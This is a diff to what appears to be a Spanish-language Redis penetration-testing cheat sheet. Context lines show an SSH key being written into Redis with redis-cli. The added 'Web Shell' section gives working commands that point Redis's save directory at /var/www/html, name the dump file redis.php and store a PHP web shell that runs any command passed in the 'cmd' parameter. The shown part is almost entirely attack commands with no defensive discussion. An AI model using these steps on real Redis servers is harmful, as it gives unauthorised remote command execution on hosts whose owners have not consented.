@@ -55,3 +55,16 @@ CONFIG GET /redis/dir/.ssh
 ```
 cat rsa_key | redis-cli -h IP -x set ssh_key
 ```
+### Web Shell
+* 1. Obtener/guessear la ruta del directorio de la web y configurarlo como directorio de redis
+```
+config set dir /var/www/html
+```
+* 2. 
+```
+config set dbfilename redis.php
+```
+* 3. Subir la shell
+```
+set test " <?php system($_GET['cmd']); ?> "
+```
